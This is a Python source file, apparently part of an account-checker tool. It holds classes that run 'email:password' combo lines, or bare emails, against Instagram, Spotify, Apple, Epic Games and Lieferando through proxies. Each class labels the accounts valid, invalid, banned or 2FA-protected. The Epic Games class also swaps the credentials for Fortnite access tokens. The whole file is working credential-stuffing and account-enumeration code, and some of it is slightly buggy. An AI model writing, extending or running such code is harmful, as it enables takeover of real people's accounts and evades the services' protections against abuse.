class Instagram:
    def __init__(self,
        line: str,
        proxy: list = None 
    ) -> None:
        self.proxy = proxy if type(proxy) is list else None
        self.line = line
        self.validate()
    def validate(self):
        import requests

        requestResponse = requests.post(
            "https://www.instagram.com/accounts/login/ajax/",
            data = "username={}&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A0%3A{}&queryParams=%7B%7D&optIntoOneTap=false".format(
                                                                                                            self.line.split(':')[0], 
                                                                                                            self.line.split(':')[1]
                                                                                                        ),
            headers = {
                'authority': 'www.instagram.com',
                'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h',
                'x-instagram-ajax': '82a581bb9399',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'user-agent': '',
                'x-requested-with': 'XMLHttpRequest',
                'x-csrftoken': 'rn3aR7phKDodUHWdDfCGlERA7Gmhes8X',
                'x-ig-app-id': '936619743392459',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'cookie': ''
            }
        )
        if '"authenticated":true' in requestResponse.text:
            self.r = "valid"
        elif ',"authenticated":false' in requestResponse.text:
            self.r = 'invalid'
        elif '{"message": "chec' in requestResponse.text or '{"errors": {"erro' in requestResponse.text:
            self.r = "retry"
        elif '{"message": "feed' in requestResponse.text or '{"message": "Plea' in requestResponse.text:
            self.r = "ban"
        else:
            self.r = "invalid"

class Spotify:
    def __init__(self,
        email: str,
        proxy: list = None 
    ) -> None:
        self.proxy = proxy if type(proxy) is list else None
        self.email = email
        self.validate()
    def validate(self):
        from core.lib.Proxy.proxy import Proxy; import requests; import json
        sess = requests.sess()
        sess.proxies = Proxy(self.proxy) if self.proxy is not None else None
        requestResponse = sess.post(
            "https://spclient.wg.spotify.com/signup/public/v1/account",
            params = {  'validate': '1',
                        'email': self.email}
        )
        requestResponseText = json.loads(requestResponse.content)['status']
        if requestResponseText == 20:
            self.r = "valid"
        elif requestResponseText == 1:
            self.r = 'invalid'
        elif requestResponseText == 0:
            self.r = "ban"
        else:
            self.r = "retry"

class Apple:
    def __init__(self,
        email: str,
        proxy: list = None 
    ) -> None:
        self.proxy = proxy if type(proxy) is list else None
        self.email = email
        self.validate()
    def validate(self):
        from core.lib.Proxy.proxy import Proxy; import requests
        sess = requests.sess()
        sess.proxies = Proxy(self.proxy) if self.proxy is not None else None
        requestResponse = sess.post(
            "https://idmsac.apple.com/IDMSWebAuth/authenticate",
            data = {  
					'accountPassword':'xxxxxxx',
					'appleId':self.email,
					'appIdKey':'f52543bf72b66552b41677a95aa808462c95ebaaaf19323ddb3be843e5100cb8'
            },
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'}
        )
        if 'Access denied. Your account does not have permission to access this application.' in requestResponse.text:
            self.r = "valid"
        elif 'Your Apple ID or password was entered incorrectly.' in requestResponse.text:
            self.r = 'invalid'
        else:
            self.r = "retry"  

class EpicGames:
    def __init__(self,
        line: str,
        proxy: list = None 
    ) -> None:
        self.proxy = proxy if type(proxy) is list else None
        self.line = line
        self.authenticate()
    def authenticate(self):
        from core.lib.Proxy.proxy import Proxy; import requests
        sess = requests.sess()
        sess.proxies = Proxy(self.proxy) if self.proxy is not None else None
        sess.get("https://www.epicgames.com/id/api/csr")
        res = sess.get(
            "https://www.epicgames.com/id/api/reputation",
            headers={ 'x-xsrf-token': sess.cookies.get("XSRF-TOKEN") },
            cookies=sess.cookies
        )
        if res.json()['verdict'] != 'allow':
            raise RuntimeError('Captcha was required for this login')

        res = sess.post(
            "https://www.epicgames.com/id/api/login",
            headers={
                "x-xsrf-token": sess.cookies.get("XSRF-TOKEN")
            },
            data={"email": self.line.split(':')[0], "password": self.line.split(':')[1],
                "rememberMe": False, "captcha": ""},
            cookies=sess.cookies
        )
        if res.status_code >= 400:
            data = res.json()
            error = data['errorCode']
            if error == 'errors.com.epicgames.account.invalid_account_credentials': self.r = 'invalid'
            if error == 'errors.com.epicgames.common.two_factor_authentication.required': self.r = '2fa'
            return
        sess.get("https://www.epicgames.com/id/api/csr")
        res = sess.post(
            "https://www.epicgames.com/id/api/exchange/generate",
            headers={"x-xsrf-token": sess.cookies.get("XSRF-TOKEN")},
            cookies=sess.cookies
        )
        exchange_code = res.json()["code"]
        res = sess.post(
            "https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token",
            headers={"Authorization": "basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE="},
            data={"grant_type": "exchange_code",  "exchange_code": exchange_code, "token_type": "eg1"}
        )
        launcher_access_token = res.json()["access_token"]
        res = sess.get(
            "https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange",
            headers={"Authorization": f"Bearer {launcher_access_token}"}
        )
        exchange_code = res.json()["code"]
        res = sess.post(
            "https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token",
            headers={"Authorization": "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ="},
            data={"grant_type": "exchange_code", "token_type": "eg1", "exchange_code": exchange_code}
        )
        fortnite_access_token = res.json()["access_token"]
        self.r = 'valid'
        self.access_token = fortnite_access_token

class TakeWay:
    def __init__(self,
        line: str,
        proxy: list = None 
    ) -> None:
        self.proxy = proxy if type(proxy) is list else None
        self.line = line
        self.validate()
    def authenticate(self):
        from core.lib.Proxy.proxy import Proxy; import requests
        from re import search
        requestResponse = requests.post(
            "https://www.lieferando.de/en/xHttp/CustomerPanel.php",
            data = "open=login",
            headers = {
                "Content-Type":"application/x-www-form-urlencoded",
                "Host":"www.lieferando.de", 
                "Connection":"keep-alive", 
                "sec-ch-ua":"\"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"", 
                "Accept":"*/*", 
                "DNT":"1", 
                "X-Requested-With":"XMLHttpRequest", 
                "sec-ch-ua-mobile":"?0", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36", 
                "Origin":"https://www.lieferando.de", 
                "Sec-Fetch-Site":"same-origin", 
                "Sec-Fetch-Mode":"cors", 
                "Sec-Fetch-Dest":"empty", 
                "Referer":"https://www.lieferando.de/en/", 
                "Accept-Language":"en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7", 
                "Accept-Encoding":"gzip, deflate", 
                "Content-Length":"10" 
            }
        )
        v = search('<input type=\"hidden\" name=\"(.*?)\"', str(search('<input type=\"hidden\" name=\"action\" value=\"customerlogin\" />(.*?)<input type=\"hidden\" name=\"redirect\" value=\"myaccount\">', str(requestResponse.text)).group(1))).group(1)
        t = search('value=\"(.*?)\"', str(requestResponse.text)).group(1)
        requestResponse = requests.post(
            "https://www.lieferando.de/en/xHttp/Auth/login.php",
            f"open=login&action=customerlogin&{v}={t}&redirect=myaccount&username={self.line.split(':')[0]}&password={self.line.split(':')[1]}",
            headers = {
                "Content-Type":"application/x-www-form-urlencoded", 
                "Host":"www.lieferando.de", 
                "Connection":"keep-alive", 
                "sec-ch-ua":"\"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"", 
                "DNT":"1", 
                "sec-ch-ua-mobile":"?0", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36", 
                "Content-Type":"application/x-www-form-urlencoded", 
                "Accept":"*/*", 
                "Origin":"https://www.lieferando.de", 
                "Sec-Fetch-Site":"same-origin", 
                "Sec-Fetch-Mode":"cors", 
                "Sec-Fetch-Dest":"empty", 
                "Referer":"https://www.lieferando.de/en/", 
                "Accept-Language":"en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7", 
                "Accept-Encoding":"gzip, deflate" 
            }
        )
        if "Your login is incorrect. Please check your username (email) and/or password and try again." in requestResponse.text:
            self.r = "invalid"
        elif "Verification code" in requestResponse.text:
            self.r = "valid"
        else:
            self.r = "retry"